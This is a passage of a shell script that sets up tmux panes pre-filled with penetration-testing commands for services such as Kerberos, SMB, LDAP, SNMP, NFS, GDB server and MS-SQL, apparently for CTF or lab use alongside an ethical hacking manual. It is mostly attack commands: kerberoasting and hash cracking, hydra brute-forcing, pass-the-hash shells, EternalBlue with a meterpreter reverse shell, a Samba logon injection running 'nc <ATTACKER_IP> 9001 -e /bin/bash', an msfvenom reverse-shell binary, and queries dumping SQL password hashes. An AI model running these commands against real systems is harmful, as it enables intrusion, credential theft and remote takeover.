tmux send-keys -t PT:13.4 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting single user" Enter
tmux send-keys -t PT:13.4 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth <USER> -dc-host $ip $domain/"
tmux send-keys -t PT:13.5 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
tmux send-keys -t PT:13.5 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -dc-ip $ip '$domain/<USER>'"
tmux send-keys -t PT:13.6 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
tmux send-keys -t PT:13.6 "crackmapexec ldap $ip -u <USER> -H '<HASH-NT>' --kerberoasting kerberoastables.txt --kdcHost $ip"
tmux send-keys -t PT:13.7 "# Kerberos KERBEROASTING: Crack token TGT with hashcat" Enter
tmux send-keys -t PT:13.7 "hashcat -m 13100 -d 3 -a 0 my.hash rockyou.txt"
tmux send-keys -t PT:13.8 "# Kerberos KERBEROASTING: Crack token TGT with JOHN" Enter
tmux send-keys -t PT:13.8 "john --format=krb5tgs --wordlist=passwords.txt kerberoastables.txt"
tmux send-keys -t PT:13.9 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
tmux send-keys -t PT:13.9 "evil-winrm -i $ip -u <utente> -p <password>"
tmux send-keys -t PT:13.10 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
tmux send-keys -t PT:13.10 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
tmux send-keys -t PT:13.11 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
tmux send-keys -t PT:13.11 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
tmux send-keys -t PT:13.12 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
tmux send-keys -t PT:13.12 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
cd $folderProject

cd $folderProjectAuthN
# POP3
tmux new-window -t PT:14 -n '[110,995] POP3'
tmux split-window -v -t PT:14.0
tmux split-window -v -t PT:14.1
tmux select-pane -t "14.1"
tmux split-window -h -t "14.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# POP3: Service fingerprint" Enter
tmux send-keys -t PT:14.0 "nmap -sV -Pn -vv -p 110 --script=pop3* $ip -oA out.110"
tmux send-keys -t PT:14.1 "# POP3: get Banner" Enter
tmux send-keys -t PT:14.1 "telnet $ip 110"
tmux send-keys -t PT:14.2 "printf \"\n# POP3: get Emails\n# USER myUser\n# PASS myPass\n# list\n# retr 5\" " Enter
tmux send-keys -t PT:14.2 "telnet $ip 110"
cd $folderProject


cd $folderProjectAuthN
# NFS
tmux new-window -t PT:15 -n '[111,2049] NFS'
tmux split-window -v -t PT:15.0
tmux split-window -v -t PT:15.1
tmux select-pane -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -v -t PT:15.4
tmux split-window -v -t PT:15.5
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# NFS: Service fingerprint" Enter
tmux send-keys -t PT:15.0 "nmap -sV -Pn -vv -p 111 --script=nfs* $ip -oA out.111"
tmux send-keys -t PT:15.1 "# NFS: Verify if NTS is enabled on top of RPC" Enter
tmux send-keys -t PT:15.1 "rpcinfo -p $ip | grep nfs"
tmux send-keys -t PT:15.2 "# NFS: get info on service exposed by RPC" Enter
tmux send-keys -t PT:15.2 "nmap -sV -Pn -vv -p 111 --script=rpc2info $ip"
tmux send-keys -t PT:15.3 "# NFS: enumerate remote folder" Enter
tmux send-keys -t PT:15.3 "showmount –e $ip"
tmux send-keys -t PT:15.4 "# NFS: mount remote folder" Enter
tmux send-keys -t PT:15.4 "sudo mkdir /mnt/opt && sudo mount -t nfs -o nolock $ip:/opt /mnt/opt"
tmux send-keys -t PT:15.5 "printf \"\n# NFS: If you get the error\n# ls: cannot open directory 'vulnix': Permission denied\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\n# NFS: Exploit: NFS root squashing\n# If NFS is active and on remote server 'no_root_squash' is active\n# then NFS root squashing attack could be possible \n# Please refer to the manual \n'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\" " Enter
cd $folderProject

cd $folderProjectAuthN
# NTQ
tmux new-window -t PT:16 -n '[123] NTP'
tmux split-window -v -t PT:16.0
tmux split-window -v -t PT:16.1
tmux select-pane -t "15.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# NTP: Service fingerprint" Enter
tmux send-keys -t PT:16.0 "nmap -sV -Pn -vv -p 123 --script=ntq* $ip -oA out.123"
tmux send-keys -t PT:16.1 "# NTP: get information from NTQ service" Enter
tmux send-keys -t PT:16.1 "ntpq -c readlist $ip && ntpq -c readvar $ip && ntpq -c peers $ip && ntpq -c associations $ip && ntpq -c iostat $ip && ntpq -c peers $ip && ntpq -c sysinfo $ip"
tmux send-keys -t PT:16.2 "# NTP: get date and time from NTQ service" Enter
tmux send-keys -t PT:16.2 "sudo python3 $folderProjectEngine/ntq.py $ip"
cd $folderProject

cd $folderProjectAuthN
# WMI
tmux new-window -t PT:17 -n '[135] WMI'
tmux split-window -v -t PT:17.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:17.0 "printf \"\nThe commands to query a WMI service must be executed on a Windows powershell. \nPlease refer to the manual 'Cyber Security: practical guide to the secrets of ethical hacking'\"" Enter
cd $folderProject

cd $folderProjectAuthN
# IMAP
tmux new-window -t PT:18 -n '[143,993] IMAP'
tmux split-window -v -t PT:18.0
tmux split-window -v -t PT:18.1
tmux select-pane -t "18.1"
tmux split-window -h -t "18.1"
tmux split-window -v -t PT:18.3
tmux select-pane -t "18.3"
tmux split-window -h -t "18.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:18.0 "# IMAP: Service fingerprint" Enter
tmux send-keys -t PT:18.0 "nmap -sV -Pn -vv -p 143 --script=imap* $ip -oA out.143"
tmux send-keys -t PT:18.1 "# IMAP: get Banner (143 port)" Enter
tmux send-keys -t PT:18.1 "nc $ip 143"
tmux send-keys -t PT:18.2 "# IMAP: get Banner (993 port)" Enter
tmux send-keys -t PT:18.2 "nc --ssl $ip 993"
tmux send-keys -t PT:18.3 "printf \"\n# IMAP: get Emails\n# login <USER> <PASSWORD>\n# SELECT INBOX\n# FETCH 1:* (FLAGS BODY[HEADER.FIELDS (SUBJECT FROM DATE)])\n# FETCH 1 BODY[]\n# LOGOUT\" " Enter
tmux send-keys -t PT:18.3 "nc $ip 143"
tmux send-keys -t PT:18.4 "printf \"\n# IMAP: get Emails\n# login <USER> <PASSWORD>\n# SELECT INBOX\n# FETCH 1:* (FLAGS BODY[HEADER.FIELDS (SUBJECT FROM DATE)])\n# FETCH 1 BODY[]\n# LOGOUT\" " Enter
tmux send-keys -t PT:18.4 "nc --ssl $ip 993"
cd $folderProject

cd $folderProjectAuthN
# SNMP
tmux new-window -t PT:19 -n '[161,162] SNMP'
tmux split-window -v -t PT:19.0
tmux split-window -v -t PT:19.1
tmux select-pane -t "19.1"
tmux split-window -h -t "19.1"
tmux split-window -v -t PT:19.3
tmux select-pane -t "19.3"
tmux split-window -h -t "19.3"
tmux split-window -h -t "19.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:19.0 "# SNMP: Service fingerprint" Enter
tmux send-keys -t PT:19.0 "nmap -sU -Pn -vv -p 161 --script=snmp* $ip -oA out.161"
tmux send-keys -t PT:19.1 "# SNMP: bruteforce community string with onwsixtyone" Enter
tmux send-keys -t PT:19.1 "onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt $ip"
tmux send-keys -t PT:19.2 "# SNMP: bruteforce community string with hydra" Enter
tmux send-keys -t PT:19.2 "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip snmp"
tmux send-keys -t PT:19.3 "printf \"\n# SNMP: Information Exposure with snmpwalk\n# Please set:\n# - version and\n# - comminuty string\n# at the begining of the script\n\" " Enter
tmux send-keys -t PT:19.3 "version=\"2c\" && community=\"public\" && ip=$ip && echo \"Retrieving network interface information\" && snmpwalk -v\$version -c \$community \$ip 1.3.6.1.2.1.4.34.1.3 && echo \"Retrieving Windows user information\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.4.1.77.1.2.25 && echo \"Retrieving active processes on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.25.4.2.1.2 && echo \"Retrieving TCP open ports on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.6.13.1.3 && echo \"Retrieving installed software on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.25.6.3.1.2 && echo \"Running SNMPWalk to retrieve general information\" && snmpwalk -v\$version -c \$community \$ip && echo \"Scan completed.\""
tmux send-keys -t PT:19.4 "# SNMP: Information Exposure with snmpenum" Enter
tmux send-keys -t PT:19.4 "snmpenum $ip public /opt/snmpenum/linux.txt"
tmux send-keys -t PT:19.5 "# SNMP: Information Exposure - get IPV6 information from SNMP (Enyx)" Enter
tmux send-keys -t PT:19.5 "python /opt/enyx/Enyx/Enyx_v3.py 1 public $ip"
cd $folderProject

cd $folderProjectAuthN
# Active Directory
tmux new-window -t PT:20 -n '[389,636] Active Directory'
tmux split-window -v -t PT:20.0
tmux split-window -v -t PT:20.1
tmux split-window -v -t PT:20.2
tmux select-pane -t "20.2"
tmux split-window -h -t "20.2"
tmux split-window -h -t "20.2"
tmux split-window -v -t PT:20.5
tmux select-pane -t "20.5"
tmux split-window -h -t "20.5"
tmux split-window -h -t "20.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:20.0 "# AD: Service fingerprint" Enter
tmux send-keys -t PT:20.0 "nmap -sU -Pn -vv -p 389 --script=ldap* $ip -oA out.389"
tmux send-keys -t PT:20.1 "# AD: anonymous authentication" Enter
tmux send-keys -t PT:20.1 "ldapsearch -x -H ldap://$ip:389 -D '' -w ''"
tmux send-keys -t PT:20.2 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.2 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -s base namingcontexts"
tmux send-keys -t PT:20.3 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.3 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -s base -b '' \"(objectClass=*)\" \"*\" +"
tmux send-keys -t PT:20.4 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.4 "nmap -p 389 --script ldap-rootdse -Pn $ip"
tmux send-keys -t PT:20.5 "# AD: get all information from Active Directory" Enter
tmux send-keys -t PT:20.5 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub"
tmux send-keys -t PT:20.6 "# AD: get all information from Active Directory filtering them with grep (e.g. to find password)" Enter
tmux send-keys -t PT:20.6 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub | grep –I –A2 –B2 password"
tmux send-keys -t PT:20.7 "# AD: get all information from Active Directory filtering them with specific query (e.g. user, person, doamin user)" Enter
tmux send-keys -t PT:20.7 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub \"(|(objectClass=person)(objectClass=user)(objectClass=Domain User))\""
cd $folderProject

cd $folderProjectAuthN
# SMB Enumeration
tmux new-window -t PT:21 -n '[389,636] SMB Enumeration'
tmux split-window -v -t PT:21.0
tmux resize-pane -t PT:21.0 -y 3
tmux split-window -v -t PT:21.1
tmux split-window -v -t PT:21.2
tmux select-pane -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -v -t PT:21.7
tmux select-pane -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -v -t PT:21.12
tmux select-pane -t "21.12"
tmux split-window -h -t "21.12"
tmux split-window -h -t "21.12"
tmux split-window -h -t "21.12"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:21.0 "# SMB: Service fingerprint" Enter
tmux send-keys -t PT:21.0 "nmap -sU -Pn -vv -p 445 --script=smb* $ip -oA out.445"
tmux send-keys -t PT:21.1 "# SMB: Bruteforce SMB2" Enter
tmux send-keys -t PT:21.1 "sudo /opt/thc-hydra/hydra -L users.txt -P passwords.txt -v $ip smb2"
tmux send-keys -t PT:21.2 "# SMB: Enum All via enum4linux" Enter
tmux send-keys -t PT:21.2 "enum4linux -a -u 'USER' -p 'PASS' $ip && echo "" && enum4linux -a -u '' -p '' $ip"
tmux send-keys -t PT:21.3 "# SMB: Enum User and Group via RCP" Enter
tmux send-keys -t PT:21.3 "sudo python rpcclient.py -u <USER> -p <PASS> $ip"
tmux send-keys -t PT:21.4 "# SMB: Enum netBIOS name, IP, MAC via netBIOS" Enter
tmux send-keys -t PT:21.4 "subnet=\"${ip%.*}.0/24\"" Enter
tmux send-keys -t PT:21.4 "nbtscan $subnet"
tmux send-keys -t PT:21.5 "# SMB: Enum netBIOS name, IP, MAC via netBIOS" Enter
tmux send-keys -t PT:21.5 "nmblookup -A $ip"
tmux send-keys -t PT:21.6 "# SMB: Enum SMB version, domain name, target name, target OS via NTLM" Enter
tmux send-keys -t PT:21.6 "sudo python /usr/share/doc/python3-impacket/examples/DumpNTLMInfo.py $ip"
tmux send-keys -t PT:21.7 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.7 "netexec smb $ip -u 'USER' -p 'PASS' --rid-brute 10000"
tmux send-keys -t PT:21.8 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.8 "crackmapexec smb $ip -u 'USER' -p 'PASS' --users --groups --pass-pol --loggedon-users --rid-brute"
tmux send-keys -t PT:21.9 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.9 "python /usr/share/doc/python3-impacket/examples/lookupsid.py 'USER:PASS'@$ip"
tmux send-keys -t PT:21.10 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.10 "/usr/share/doc/python3-impacket/examples/lookupsid.py -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' '$domain/USER@$ip'"
tmux send-keys -t PT:21.11 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.11 "impacket-net '<USER>':'<PASS>'@$ip user'"
tmux send-keys -t PT:21.12 "# SMB: Enum Domain Group" Enter
tmux send-keys -t PT:21.12 "impacket-net '<USER>':'<PASS>'@$ip group"
tmux send-keys -t PT:21.13 "# SMB: Enum Domain Group" Enter
tmux send-keys -t PT:21.13 "crackmapexec smb $ip -u 'USER' -p 'PASS' -d '$domain' --groups"
tmux send-keys -t PT:21.14 "# SMB: Enum Local Group" Enter
tmux send-keys -t PT:21.14 "impacket-net '<USER>':'<PASS>'@$ip localgroup"
tmux send-keys -t PT:21.15 "# SMB: Enum Local Group" Enter
tmux send-keys -t PT:21.15 "crackmapexec smb $ip -u 'USER' -p 'PASS' -d '$domain' --local-groups"
cd $folderProject

cd $folderProjectAuthN
# SMB Credential Verification
tmux new-window -t PT:22 -n '[389,636] SMB Credential Verification & Reset Password'
tmux split-window -v -t PT:22.0
tmux select-pane -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -v -t PT:22.3
tmux select-pane -t "22.3"
tmux split-window -h -t "22.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:22.0 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.0 "netexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" && netexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && netexec smb $ip -u 'dontknow' -p '' --continue-on-success && echo "" && netexec smb $ip -u '' -p '' --continue-on-success"
tmux send-keys -t PT:22.1 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u '' -p '' --no-bruteforce --continue-on-success"
tmux send-keys -t PT:22.2 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.2 "msfconsole -x \"use auxiliary/scanner/smb/smb_login; set RHOSTS $ip ; set USER_FILE users.txt ; set PASS_FILE passwords.txt ; set DOMAIN $domain ; run\""
tmux send-keys -t PT:22.3 "# SMB Reset Password" Enter
tmux send-keys -t PT:22.3 "smbpasswd -U <USER> -r $ip"
tmux send-keys -t PT:22.4 "# SMB Reset Password" Enter
tmux send-keys -t PT:22.4 "python $folderProjectEngine/resetSMBpass.py -t $ip -u <USER> -p <PASS> -n <NEW-PASS> -f users.txt"
cd $folderProject

cd $folderProjectAuthN
# SMB Credential Verification
tmux new-window -t PT:23 -n '[389,636] SMB Shared Folders'
tmux split-window -v -t PT:23.0
tmux select-pane -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -v -t PT:23.4
tmux select-pane -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -v -t PT:23.10
tmux select-pane -t "23.10"
tmux split-window -h -t "23.10"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:23.0 "# SMB find Shared Folders" Enter
tmux send-keys -t PT:23.0 "netexec smb $ip -u users.txt -p passwords.txt --shares && echo "" && netexec smb $ip -u users.txt -p users.txt --shares && echo "" && netexec smb $ip -u 'dontknow' -p '' --shares && echo "" && netexec smb $ip -u '' -p '' --shares" 
tmux send-keys -t PT:23.1 "# SMB find Shared Folders" Enter
tmux send-keys -t PT:23.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --shares && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --shares && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --shares && echo "" && crackmapexec smb $ip -u '' -p ''" 
tmux send-keys -t PT:23.2 "# SMB find Shared Folders (with spider_plus)" Enter
tmux send-keys -t PT:23.2 "netexec smb $ip -u users.txt -p passwords.txt -M spider_plus && echo "" && netexec smb $ip -u users.txt -p users.txt -M spider_plus && echo "" && netexec smb $ip -u 'dontknow' -p '' -M spider_plus && echo "" && netexec smb $ip -u '' -p '' -M spider_plus" 
tmux send-keys -t PT:23.3 "# SMB find Shared Folders (with spider_plus)" Enter
tmux send-keys -t PT:23.3 "crackmapexec smb $ip -u users.txt -p passwords.txt -M spider_plus && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt -M spider_plus && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' -M spider_plus && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' -M spider_plus"
tmux send-keys -t PT:23.4 "# SMB Read Shared Folders" Enter 
tmux send-keys -t PT:23.4 "smbmap -H $ip -u USER -p PASS -r --depth 5"
tmux send-keys -t PT:23.5 "# SMB Download Shared Folders" Enter 
tmux send-keys -t PT:23.5 "smbmap -R $sharename -H $ip -A FILE -q"
tmux send-keys -t PT:23.6 "# SMB Read Shared Folders" Enter 
tmux send-keys -t PT:23.6 "xdg-open smb://$ip/"
tmux send-keys -t PT:23.7 "# SMB Download Shared Folders" Enter 
tmux send-keys -t PT:23.7 "smbclient -U <USER>:<PASS> //$ip/<remote folder> -N -c 'prompt OFF;recurse ON;lcd '<local kali folder>';mget *'"
tmux send-keys -t PT:23.8 "printf \"\n# SMB: Read Shared Folders\n# To download file use these commands\n# smb> prompt off\n# smb> recurse on\n# smb> mget *\n\" " Enter
tmux send-keys -t PT:23.8 "smbclient -u 'USER' -p 'PASS' -L \\\\$ip\\SHARE-FOLDER"
tmux send-keys -t PT:23.9 "# SMB Mount Shared Folders" Enter 
tmux send-keys -t PT:23.9 "mount -t cifs -o "username=USER,password=PASS,domain=$domain" //$ip/share /mnt/share"
tmux send-keys -t PT:23.10 "printf \"\n# SMB: If you get the error\n# ls: cannot open directory: Permission denied\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\" " Enter
tmux send-keys -t PT:23.11 "printf \"\n# SMB: To find hidden files\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\" " Enter
cd $folderProject

cd $folderProjectAuthN
# SMB Execute command - Vulnerabilities - Reverse Shell
tmux new-window -t PT:24 -n '[389,636] SMB Execute command - Vulnerabilities - Reverse Shell'
tmux split-window -v -t PT:24.0
tmux select-pane -t "24.0"
tmux split-window -h -t "24.0"
tmux split-window -v -t PT:24.2
tmux split-window -v -t PT:24.3
tmux select-pane -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -v -t PT:24.8
tmux select-pane -t "24.8"
tmux split-window -h -t "24.8"
tmux split-window -h -t "24.8"
tmux split-window -h -t "24.8"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:24.0 "# SMB Execute Command" Enter
tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command>"
tmux send-keys -t PT:24.1 "# SMB Execute Command" Enter
tmux send-keys -t PT:24.1 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command> --force-ps32"
tmux send-keys -t PT:24.2 "# SMB Known Vulnerabilities" Enter
tmux send-keys -t PT:24.2 "crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M zerologon && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M nopac && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M petitpotam && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M shadowcoerce && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M dfscoerce"
tmux send-keys -t PT:24.3 "# SMB Activate Reverse Shell with smbclient" Enter
tmux send-keys -t PT:24.3 "nc -nlvp 9001"
tmux send-keys -t PT:24.4 "printf \"\n# SMB Activate Reverse Shell with smbclient\n# after smbclient connect try this command:\nsmb> logon \"/=nc '<ATTACKER_IP>' 9001 -e /bin/bash\" \" " Enter
tmux send-keys -t PT:24.4 "smbclient -U "username%password" //$ip/sharename"
tmux send-keys -t PT:24.5 "# SMB Activate Reverse Shell with msfconsole" Enter
tmux send-keys -t PT:24.5 "msfconsole -x \"use auxiliary/admin/smb/samba_symlink_traversal; set rhosts $ip; set smbshare tmp; run\""
tmux send-keys -t PT:24.6 "# SMB Activate Reverse Shell with EternalBlue" Enter
tmux send-keys -t PT:24.6 "nmap -p 445 --script smb-vuln-ms17-010 -Pn -n $ip"
tmux send-keys -t PT:24.7 "# SMB Activate Reverse Shell with EternalBlue" Enter
tmux send-keys -t PT:24.7 "sudo msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $ip; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; exploit\""
tmux send-keys -t PT:24.8 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
tmux send-keys -t PT:24.8 "python /usr/share/doc/python3-impacket/examples/psexec.py USER@$ip"
tmux send-keys -t PT:24.9 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
tmux send-keys -t PT:24.9 "python /usr/share/doc/python3-impacket/examples/psexec.py -hashes d9…dff:d9…dff USER@$ip"
tmux send-keys -t PT:24.10 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
tmux send-keys -t PT:24.10 "python psexec.py <username>:<pass>@$ip whoami"
tmux send-keys -t PT:24.11 "printf \"\n# SMB Activate Reverse Shell with CRedentials\n# I can get the same results with the following tools that use the same notation as psexec: smbexec, dcomexec, crackmapexec \" " Enter
tmux send-keys -t PT:24.11 ""
cd $folderProject

cd $folderProjectAuthN
# GDB Server
tmux new-window -t PT:25 -n '[1337] GDB Server'
tmux split-window -v -t PT:25.0
tmux split-window -v -t PT:25.1
tmux split-window -v -t PT:25.2
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:25.0 "# GDB: Activate a listener" Enter
tmux send-keys -t PT:25.0 "nc -nlvp 9001"
tmux send-keys -t PT:25.1 "# GDB: Create an executable reverse shell" Enter
tmux send-keys -t PT:25.1 "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=9001 PrependFork=true -f elf -o binary.elf && chmod +x binary.elf"
tmux send-keys -t PT:25.2 "printf \"\n# GDB: Activate GDB\n# Use these command to implement the attack:\n# (gdb) target extended-remote $ip:1337\n# (gdb) remote put binary.elf binary.elf\n# (gdb) set remote exec-file /home/user/binary.elf\n# (gdb) run\n\" " Enter
tmux send-keys -t PT:25.2 "gdb binary.elf"
cd $folderProject

cd $folderProjectAuthN
# GDB Server
tmux new-window -t PT:26 -n '[1443] MS-SQL: verify credentials, access DB, extract usefull info'
tmux split-window -v -t PT:26.0
tmux resize-pane -t PT:26.0 -y 3
tmux split-window -v -t PT:26.1
tmux split-window -v -t PT:26.2
tmux select-pane -t "26.2"
tmux split-window -h -t "26.2"
tmux split-window -v -t PT:26.4
tmux select-pane -t "26.4"
tmux split-window -h -t "26.4"
tmux split-window -h -t "26.4"
tmux split-window -h -t "26.4"
tmux split-window -v -t PT:26.8
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:26.0 "# MS-SQL: Service fingerprint" Enter
tmux send-keys -t PT:26.0 "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip"
tmux send-keys -t PT:26.1 "# MS-SQL: verify credentials" Enter
tmux send-keys -t PT:26.1 "crackmapexec mssql $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec mssql $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec mssql $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec mssql $ip -u '' -p '' --no-bruteforce --continue-on-success"
tmux send-keys -t PT:26.2 "# MS-SQL: execute command with Credentials" Enter
tmux send-keys -t PT:26.2 "crackmapexec mssql $ip -d $domain -u USER -p PASS -x "whoami""
tmux send-keys -t PT:26.3 "# MS-SQL: execute command with HASH" Enter
tmux send-keys -t PT:26.3 "crackmapexec mssql $ip -d $domain -u USER -H HASH-NT -X '$PSVersionTable'"
tmux send-keys -t PT:26.4 "# MS-SQL: Access to database with windows authN and domain" Enter
tmux send-keys -t PT:26.4 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py '$domain/USER:PASS'@$ip -windows-auth"
tmux send-keys -t PT:26.5 "# MS-SQL: Access to database with windows authN" Enter
tmux send-keys -t PT:26.5 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip -windows-auth"
tmux send-keys -t PT:26.6 "# MS-SQL: Access to database with SQL credentials" Enter
tmux send-keys -t PT:26.6 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:26.7 "printf \"\n# MS-SQL: Access to database with SQL credentials \n# Note:\n# When using the sqsh command, the SQL commands must be executed by giving a GO command \n\" " Enter
tmux send-keys -t PT:26.7 "sqsh -S $ip -U $domain\\USER -P PASS"
tmux send-keys -t PT:26.8 "printf \"\n# # MS-SQL: data exfiltration\n# # Get version\n# SQL> select @@version;\n# Returns the current database user\n# SQL> select user_name();\n# Get users that can run xp_cmdshell\n# SQL> Use master\n# SQL> EXEC sp_helprotect 'xp_cmdshell'\n# Get databases\n# SQL> SELECT name FROM master.dbo.sysdatabases;\n#Get table names\n# SQL> USE master\n# SQL> SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;\n# Find List Linked Servers\n# SQL> EXEC sp_linkedservers\n# I search for all servers connected to the remote server. So this is a more generic query\n# SQL> SELECT * FROM sys.servers;\n# report about logins configured in the instance\n# SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in 